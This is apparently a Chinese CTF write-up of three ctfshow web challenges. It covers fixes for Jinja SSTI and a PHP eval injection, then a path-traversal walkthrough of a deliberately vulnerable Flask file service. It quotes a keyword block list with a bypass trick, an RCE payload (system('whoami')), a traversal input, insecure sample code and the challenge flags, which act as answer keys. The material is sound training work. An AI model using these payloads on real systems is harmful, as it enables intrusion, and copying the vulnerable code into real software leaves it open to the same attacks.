<h2 id="8-SafeCard"><a href="#8-SafeCard" class="headerlink" title="8.SafeCard"></a>8.SafeCard</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目描述</span><br><span class="line">业务功能一定要正常哦</span><br></pre></td></tr></table></figure>

<p>app.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, render_template</span><br><span class="line">from jinja2 import Environment, BaseLoader</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&quot;FLAG&quot;] = os.environ.get(&quot;FLAG&quot;, &quot;CTF&#123;dev_flag_placeholder&#125;&quot;)</span><br><span class="line"></span><br><span class="line">jinja = Environment(</span><br><span class="line">    loader=BaseLoader(),</span><br><span class="line">    autoescape=True,</span><br><span class="line">    variable_start_string=&quot;$&#123;&quot;,</span><br><span class="line">    variable_end_string=&quot;&#125;&quot;,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 过滤器函数依然保留，用于处理name等其他未来可能的用户输入</span><br><span class="line"># 尽管SSTI漏洞被根除，但保留输入清洗是一个好习惯</span><br><span class="line">BLOCK_WORDS = [</span><br><span class="line">    &quot;import&quot;, &quot;os&quot;, &quot;subprocess&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;open&quot;, &quot;read&quot;, &quot;write&quot;,</span><br><span class="line">    &quot;globals&quot;, &quot;locals&quot;, &quot;builtins&quot;, &quot;class&quot;, &quot;mro&quot;, &quot;subclasses&quot;,</span><br><span class="line">    &quot;request&quot;, &quot;config&quot;, &quot;cycler&quot;, &quot;joiner&quot;, &quot;namespace&quot;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def heavy_filter(s: str) -&gt; str:</span><br><span class="line">    if not isinstance(s, str):</span><br><span class="line">        return &quot;&quot;</span><br><span class="line">    s = s[:800]</span><br><span class="line">    # 保留这些替换，可以作为一种额外的XSS防护层</span><br><span class="line">    s = s.replace(&quot;&#123;&#123;&quot;, &quot;&quot;).replace(&quot;&#125;&#125;&quot;, &quot;&quot;)</span><br><span class="line">    s = s.replace(&quot;&#123;%&quot;, &quot;&quot;).replace(&quot;%&#125;&quot;, &quot;&quot;)</span><br><span class="line">    s = s.replace(&quot;&#123;#&quot;, &quot;&quot;).replace(&quot;#&#125;&quot;, &quot;&quot;)</span><br><span class="line"></span><br><span class="line">    s = re.sub(r&quot;[\x00-\x08\x0B\x0C\x0E-\x1F]&quot;, &quot;&quot;, s)</span><br><span class="line"></span><br><span class="line">    # 过滤器的核心逻辑不再是SSTI的主要防线，但可以保留用于清洗name</span><br><span class="line">    lower = s.lower()</span><br><span class="line">    for w in BLOCK_WORDS:</span><br><span class="line">        if w in lower:</span><br><span class="line">            s = re.sub(re.escape(w), &quot;&quot;, s, flags=re.IGNORECASE)</span><br><span class="line">            lower = s.lower()</span><br><span class="line"></span><br><span class="line">    s = s.replace(&quot;..&quot;, &quot;&quot;).replace(&quot;//&quot;, &quot;&quot;).replace(&quot;\\\\&quot;, &quot;\\&quot;)</span><br><span class="line">    return s</span><br><span class="line"></span><br><span class="line">@app.get(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line">@app.post(&quot;/preview&quot;)</span><br><span class="line">def preview():</span><br><span class="line">    # 对用户输入的 name 进行过滤</span><br><span class="line">    name = heavy_filter(request.form.get(&quot;name&quot;, &quot;&quot;))</span><br><span class="line">    </span><br><span class="line">    # 【漏洞修复关键点】</span><br><span class="line">    # 不再从用户请求中获取模板(tpl)，而是使用一个固定的、安全的模板。</span><br><span class="line">    # 这从根本上消除了服务器端模板注入（SSTI）漏洞。</span><br><span class="line">    # The user should provide DATA, not CODE.</span><br><span class="line">    if name.strip() == &quot;&quot;:</span><br><span class="line">        name = &quot;Guest&quot;</span><br><span class="line">    </span><br><span class="line">    # 使用一个由开发者定义的静态安全模板</span><br><span class="line">    tpl = &quot;新年快乐，$&#123;name&#125;！愿你 $&#123;year&#125; 天天好心情～&quot;</span><br><span class="line">    </span><br><span class="line">    ctx = &#123;</span><br><span class="line">        &quot;name&quot;: name,</span><br><span class="line">        &quot;year&quot;: str(datetime.now().year)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        # 现在渲染的是我们自己定义的模板，是完全安全的</span><br><span class="line">        out = jinja.from_string(tpl).render(ctx)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        # 正常情况下不应再触发异常，但保留以确保健壮性</span><br><span class="line">        out = &quot;模板渲染失败：请检查输入内容&quot;</span><br><span class="line"></span><br><span class="line">    return &#123;&quot;ok&quot;: True, &quot;html&quot;: out&#125;</span><br><span class="line"></span><br><span class="line">@app.get(&quot;/healthz&quot;)</span><br><span class="line">def healthz():</span><br><span class="line">    return &quot;ok&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, port=5000)</span><br></pre></td></tr></table></figure>

<ol>
<li>漏洞根源（修复前）</li>
</ol>
<ul>
<li><strong>用户可控的模板代码</strong>: 在原始代码中，<code>preview</code> 函数通过 <code>tpl = heavy_filter(request.form.get(&quot;tpl&quot;, &quot;&quot;))</code> 获取用户提交的 <code>tpl</code> 参数。</li>
<li><strong>直接渲染用户输入</strong>: 应用随后将这个来自用户的、不可信的 <code>tpl</code> 字符串直接传入 <code>jinja.from_string(tpl).render(ctx)</code> 进行渲染。</li>
<li><strong>后果</strong>: 这允许攻击者构造恶意的模板语法。虽然存在一个 <code>heavy_filter</code> 黑名单过滤器，但它存在绕过缺陷（例如，传入 <code>conconfigfig</code> 会被过滤成 <code>config</code>），攻击者可以利用这个缺陷来读取应用的配置信息（如 <code>app.config</code>，其中包含 <code>FLAG</code>），甚至在更复杂的场景下实现远程代码执行。</li>
</ul>
<ol start="2">
<li>修复方案（补丁中）</li>
</ol>
<p>补丁的核心思想是遵循了安全开发中的黄金法则：<strong>代码与数据分离 (Code-Data Separation)</strong>。</p>
<p>具体的修复点如下：</p>
<ol>
<li><p><strong>移除了用户对模板的控制权</strong>:</p>
<ul>
<li><strong>修复前</strong>: <code>tpl</code> 变量的值来自于 <code>request.form.get(&quot;tpl&quot;, &quot;&quot;)</code>。</li>
<li><strong>修复后</strong>: 代码中完全删除了从请求中获取 <code>tpl</code> 的逻辑。</li>
</ul>
</li>
<li><p><strong>使用了静态、安全的模板</strong>:</p>
<ul>
<li><strong>修复后</strong>: <code>tpl</code> 变量被硬编码为一个由开发者定义的、固定的字符串：<code>tpl = &quot;新年快乐，$&#123;name&#125;！愿你 $&#123;year&#125; 天天好心情～&quot;</code>。</li>
</ul>
</li>
</ol>
<p> 总结</p>
<p>这份补丁通过<strong>将模板内容从“用户可控”变为“服务器端静态定义”</strong>，从根本上消除了服务器端模板注入（SSTI）的攻击面。</p>
<p>现在，用户的输入 (<code>name</code>) 只能作为<strong>数据</strong>被填充到模板的 <code>$&#123;name&#125;</code> 占位符中，而无法再作为<strong>代码</strong>（模板指令）被执行。这是一种彻底且安全的修复方式。</p>
<p>同时，该修复方案保留了用户输入名字生成贺卡的业务功能，完美符合了 “业务功能一定要正常哦” 的要求。</p>
<p>flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;3ce68e7a392155f6b96d5736717eaebf&#125;</span><br></pre></td></tr></table></figure>

<h2 id="9-SafeCalc"><a href="#9-SafeCalc" class="headerlink" title="9.SafeCalc"></a>9.SafeCalc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目描述</span><br><span class="line">过于简单，不用防御（我是菜鸟hh）</span><br></pre></td></tr></table></figure>

<p>calc.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header(&#x27;Content-Type: application/json; charset=utf-8&#x27;);</span><br><span class="line"></span><br><span class="line">// 增加一个严格的白名单正则表达式</span><br><span class="line">// 只允许数字、小数点、括号、四则运算符和空格</span><br><span class="line">// ^: 字符串开头, $: 字符串结尾, 保证整个字符串都匹配规则</span><br><span class="line">const ALLOWED_CHARS_PATTERN = &#x27;/^[0-9\.\+\-\*\/\(\)\s]*$/&#x27;;</span><br><span class="line"></span><br><span class="line">$expr = $_POST[&#x27;expr&#x27;] ?? &#x27;&#x27;;</span><br><span class="line">if (!is_string($expr)) fail(&#x27;bad request&#x27;);</span><br><span class="line"></span><br><span class="line">$expr = trim($expr);</span><br><span class="line">if ($expr === &#x27;&#x27;) fail(&#x27;empty&#x27;);</span><br><span class="line"></span><br><span class="line">if (strlen($expr) &gt; 100) fail(&#x27;too long&#x27;);</span><br><span class="line"></span><br><span class="line">// 【关键修复点】</span><br><span class="line">// 使用正则表达式检查输入是否只包含允许的字符</span><br><span class="line">if (!preg_match(ALLOWED_CHARS_PATTERN, $expr)) &#123;</span><br><span class="line">    fail(&#x27;invalid expression characters&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 为了防止类似 (1/0) 这样的除零错误导致服务崩溃，使用 try-catch 包裹</span><br><span class="line">$out = &quot;&quot;;</span><br><span class="line">try &#123;</span><br><span class="line">    // 在严格的白名单校验后，eval 不再能执行任意代码，但仍可能因语法错误或运行时错误(如除零)而失败</span><br><span class="line">    // 使用 @ 抑制除零等 warning, 并通过 ErrorException 捕获</span><br><span class="line">    set_error_handler(function($severity, $message, $file, $line) &#123;</span><br><span class="line">        throw new ErrorException($message, 0, $severity, $file, $line);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    eval(&quot;\$out = ($expr);&quot;);</span><br><span class="line"></span><br><span class="line">    restore_error_handler();</span><br><span class="line">&#125; catch (Throwable $e) &#123;</span><br><span class="line">    // 捕获所有可能的错误（包括 ParseError 和 ErrorException）</span><br><span class="line">    restore_error_handler();</span><br><span class="line">    fail(&#x27;invalid expression syntax&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 检查结果是否是数字或布尔值，防止意外输出</span><br><span class="line">if (!is_numeric($out) &amp;&amp; !is_bool($out)) &#123;</span><br><span class="line">    $out = 0; // 或者 fail()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo json_encode([&#x27;ok&#x27; =&gt; true, &#x27;result&#x27; =&gt; $out], JSON_UNESCAPED_UNICODE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function fail(string $msg, int $code = 400): void &#123;</span><br><span class="line">    http_response_code($code);</span><br><span class="line">    echo json_encode([&#x27;ok&#x27; =&gt; false, &#x27;error&#x27; =&gt; $msg], JSON_UNESCAPED_UNICODE);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>核心漏洞：远程代码执行 (RCE)</li>
</ol>
<p><strong>漏洞成因：</strong></p>
<p>原始代码中最危险的一行是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$out=(<span class="subst">$expr</span>);&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>eval()</code> 函数会将其中的字符串参数当作 PHP 代码来执行。原始代码对用户输入的 <code>$expr</code> 变量几乎没有做任何有效的安全过滤，仅仅是检查了长度。</p>
<p>这就意味着，攻击者可以提交任意的 PHP 代码片段作为 <code>expr</code> 的值，这些代码将在你的服务器上被执行。</p>
<p><strong>攻击示例（原始代码会如何被攻击）：</strong></p>
<p>如果攻击者发送一个 POST 请求，内容为 <code>expr=system(&#39;whoami&#39;)</code>，那么服务器上 <code>eval()</code> 执行的代码就会变成：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$out</span> = (<span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>这会导致服务器执行 <code>whoami</code> 命令，并将执行结果（例如 <code>www-data</code>）返回给攻击者。通过这种方式，攻击者可以：</p>
<ul>
<li>执行任意系统命令 (<code>ls</code>, <code>cat /etc/passwd</code> 等) 来窃取信息。</li>
<li>写入一个 Webshell 文件，从而持久化地控制你的服务器。</li>
<li>获取一个反弹 Shell，完全接管服务器权限。</li>
</ul>
<p>这是一个最高危级别的漏洞。</p>
<hr>
<ol start="2">
<li>修复措施详解</li>
</ol>
<p>你提供的这段修复代码，通过以下几个关键步骤，有效地封堵了这个漏洞：</p>
<p> <strong>第一道防线（核心修复）：输入白名单验证</strong></p>
<p>这是最关键的修复。代码中增加了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">ALLOWED_CHARS_PATTERN</span> = <span class="string">&#x27;/^[0-9\.\+\-\*\/\(\)\s]*$/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(ALLOWED_CHARS_PATTERN, <span class="variable">$expr</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">fail</span>(<span class="string">&#x27;invalid expression characters&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>原理</strong>：这里采用了<strong>白名单</strong>策略，而不是黑名单。它定义了一个只包含“安全”字符的集合：数字 (<code>0-9</code>)、小数点 (<code>.</code>)、四则运算符 (<code>+ - * /</code>)、括号 (<code>()</code>) 和空格。</li>
<li><strong>效果</strong>：<code>preg_match</code> 会检查用户输入的 <code>$expr</code> 是否<strong>完全</strong>由这些白名单字符组成。任何包含字母（如 <code>a-z</code>）、分号 (<code>;</code>)、美元符号 (<code>$</code>)、反引号 (<code>`</code>) 等危险字符的输入都会被直接拒绝。这样一来，攻击者就无法构造任何函数名（如 <code>system</code>）或执行任何命令，从根本上杜绝了代码注入的可能性。</li>
</ul>
<p> <strong>第二道防线：健壮性与错误处理</strong></p>
<p>虽然白名单已经阻止了代码执行，但用户仍可能输入格式错误的数学表达式（如 <code>5+*3</code>）或导致运行时错误的表达式（如 <code>1/0</code>）。修复代码通过 <code>try...catch</code> 块和自定义错误处理器增强了程序的健壮性：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(function(...) &#123; ... &#125;);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;\$out = (<span class="subst">$expr</span>);&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">restore_error_handler</span>();</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">restore_error_handler</span>();</span><br><span class="line">    <span class="title function_ invoke__">fail</span>(<span class="string">&#x27;invalid expression syntax&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>效果</strong>：这段代码可以捕获 <code>eval()</code> 在执行过程中可能抛出的任何解析错误（ParseError）或运行时警告&#x2F;错误（如除以零），并将其统一作为 “invalid expression syntax” 失败信息返回，而不会导致 PHP 进程崩溃或在页面上暴露详细的错误堆栈信息。这防止了潜在的**拒绝服务（Denial of Service, DoS）**攻击和信息泄露。</li>
</ul>
<p> <strong>第三道防线：输出验证</strong></p>
<p>在代码的最后，增加了对结果的检查：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$out</span>) &amp;&amp; !<span class="title function_ invoke__">is_bool</span>(<span class="variable">$out</span>)) &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>效果</strong>：这是一个纵深防御措施。它确保了即使在极端意想不到的情况下 <code>eval()</code> 产生了非数字类型的结果，最终返回给前端的也只会是一个安全的、预期的数值（这里是 <code>0</code>），防止任何潜在的信息泄露。</li>
</ul>
<p> 总结</p>
<p>总而言之，这段修复代码：</p>
<ol>
<li><strong>修复了核心的远程代码执行（RCE）漏洞</strong>，通过严格的输入白名单，将用户输入限制在纯数学计算的范畴内。</li>
<li><strong>提升了程序的健壮性</strong>，通过完善的错误处理，防止了因非法数学表达式导致的程序崩溃或信息泄露，也防御了简单的拒绝服务攻击。</li>
<li><strong>贯彻了“纵深防御”的安全思想</strong>，在输入、执行、输出三个环节都设置了检查和保护措施。</li>
</ol>
<p>这是一个非常标准和优秀的漏洞修复范例。</p>
<p>flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;62b80ac3c42fe6e9fe7e76e8ed68ca5b&#125;</span><br></pre></td></tr></table></figure>

<h2 id="10-SafeViewer"><a href="#10-SafeViewer" class="headerlink" title="10.SafeViewer"></a>10.SafeViewer</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">题目描述</span><br><span class="line">SafeViewer SafeRender SafeAdmin 共同使用本题的环境</span><br><span class="line"></span><br><span class="line">这3个题目 的flag前面 都会有明显的说明 是哪个题目的flag</span><br><span class="line"></span><br><span class="line">环境变量中flag是占位，和题目无关</span><br></pre></td></tr></table></figure>

<p>第一个flag比较好找你直接在path里输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../../../</span><br></pre></td></tr></table></figure>

<p>查看根目录，根目录下就有flag文件但是下载完发现没东西，你再看看app那个文件点进去发现app.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import zipfile</span><br><span class="line">from flask import Flask, request, Response, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">DATA_DIR = os.environ.get(&quot;B_DATA_DIR&quot;, &quot;/tmp/b_data&quot;)</span><br><span class="line">os.makedirs(DATA_DIR, exist_ok=True)</span><br><span class="line"></span><br><span class="line">def _safe_join(base: str, p: str) -&gt; str:</span><br><span class="line">    return os.path.join(base, p)</span><br><span class="line"></span><br><span class="line">#恭喜你，拿到SafeViewer的FLAG ctfshow&#123;21afe5f9839175d79e0adbcb9d7f2198&#125;</span><br><span class="line">@app.get(&quot;/internal/file&quot;)</span><br><span class="line">def internal_file():</span><br><span class="line">    path = request.args.get(&quot;path&quot;, &quot;docxTemplates&quot;)</span><br><span class="line">    filename = request.args.get(&quot;filename&quot;, &quot;&quot;)</span><br><span class="line"></span><br><span class="line">    target_dir = _safe_join(DATA_DIR, path)</span><br><span class="line"></span><br><span class="line">    if filename:</span><br><span class="line">        fp = os.path.join(target_dir, filename)</span><br><span class="line">        try:</span><br><span class="line">            with open(fp, &quot;rb&quot;) as f:</span><br><span class="line">                return Response(f.read(), content_type=&quot;application/octet-stream&quot;)</span><br><span class="line">        except Exception:</span><br><span class="line">            return Response(&quot;NOT_FOUND&quot;, status=404)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        items = []</span><br><span class="line">        for n in sorted(os.listdir(target_dir)):</span><br><span class="line">            p = os.path.join(target_dir, n)</span><br><span class="line">            items.append(&#123;&quot;name&quot;: n, &quot;is_dir&quot;: os.path.isdir(p)&#125;)</span><br><span class="line">        return jsonify(&#123;&quot;path&quot;: path, &quot;items&quot;: items&#125;)</span><br><span class="line">    except Exception:</span><br><span class="line">        return jsonify(&#123;&quot;path&quot;: path, &quot;items&quot;: []&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.get(&quot;/render&quot;)</span><br><span class="line">def render_xml():</span><br><span class="line">    content = request.args.get(&quot;content&quot;, &quot;Hello&quot;)</span><br><span class="line">    author = request.args.get(&quot;author&quot;, &quot;Anonymous&quot;)</span><br><span class="line">    hide = request.args.get(&quot;hide&quot;, &quot;0&quot;)</span><br><span class="line">    xml = f&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">            &lt;!-- post by &#123;author&#125; --&gt;</span><br><span class="line">            &lt;doc&gt;</span><br><span class="line">            &lt;content&gt;&#123;content&#125;&lt;/content&gt;</span><br><span class="line">            &lt;hide&gt;&#123;hide&#125;&lt;/hide&gt;</span><br><span class="line">            &lt;/doc&gt;</span><br><span class="line">            &#x27;&#x27;&#x27;</span><br><span class="line">    return Response(xml, content_type=&quot;text/xml; charset=utf-8&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#处理SafeViewer服务器的http://viewer:5000/ops/sync接口 过来的数据同步请求</span><br><span class="line">@app.post(&quot;/internal/upload&quot;)</span><br><span class="line">def internal_upload():</span><br><span class="line">    dest_path = &quot;docxTemplates&quot;</span><br><span class="line"></span><br><span class="line">    if &quot;file&quot; not in request.files:</span><br><span class="line">        return _err(&quot;NO_FILE&quot;)</span><br><span class="line"></span><br><span class="line">    f = request.files[&quot;file&quot;]</span><br><span class="line">    if not f or not f.filename:</span><br><span class="line">        return _err(&quot;BAD_FILE&quot;)</span><br><span class="line"></span><br><span class="line">    base_dir = os.path.join(&quot;/app/&quot;, dest_path)</span><br><span class="line">    os.makedirs(base_dir, exist_ok=True)</span><br><span class="line">    zip_path = os.path.join(base_dir, &quot;src.zip&quot;)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        f.save(zip_path)</span><br><span class="line">    except Exception:</span><br><span class="line">        return _err(&quot;SAVE_FAILED&quot;)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        with zipfile.ZipFile(zip_path, &quot;r&quot;) as z:</span><br><span class="line">            z.extractall(base_dir)</span><br><span class="line">    except Exception:</span><br><span class="line">        return _err(&quot;UNZIP_FAILED&quot;)</span><br><span class="line">    finally:</span><br><span class="line">        try:</span><br><span class="line">            os.remove(zip_path)</span><br><span class="line">        except Exception:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">    return jsonify(&#123;&quot;ok&quot;: True, &quot;path&quot;: dest_path&#125;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=5001,debug=False)</span><br></pre></td></tr></table></figure>

<p>从这里注释可以发现flag1:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;21afe5f9839175d79e0adbcb9d7f2198&#125;</span><br></pre></td></tr></table></figure>

